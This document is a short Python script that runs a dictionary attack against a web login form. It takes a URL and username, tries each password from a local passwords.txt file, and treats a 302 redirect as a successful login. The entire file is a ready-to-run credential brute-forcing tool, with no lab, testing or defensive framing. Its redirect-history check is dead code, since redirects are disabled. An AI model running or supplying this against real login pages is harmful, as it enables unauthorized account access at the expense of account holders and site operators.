import requests

url = input("Enter the URL: ")
username = input("Enter the username: ")

def send_request(password):
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data, allow_redirects=False)
    
    # Check if the response or any of the redirection responses has a 302 status code
    if any(r.status_code == 302 for r in response.history):
        response_code = 302
    else:
        response_code = response.status_code

    print(f"Trying: Password: {password}, Response Code: {response_code}")
    return response_code

with open('passwords.txt', 'r') as file:
    passwords = file.read().splitlines()

found_password = None

for password in passwords:
    response_code = send_request(password)
    if response_code == 302:
        found_password = password
        break

if found_password:
    print(f"Correct Password: {found_password}")
else:
    print("Password not found.")
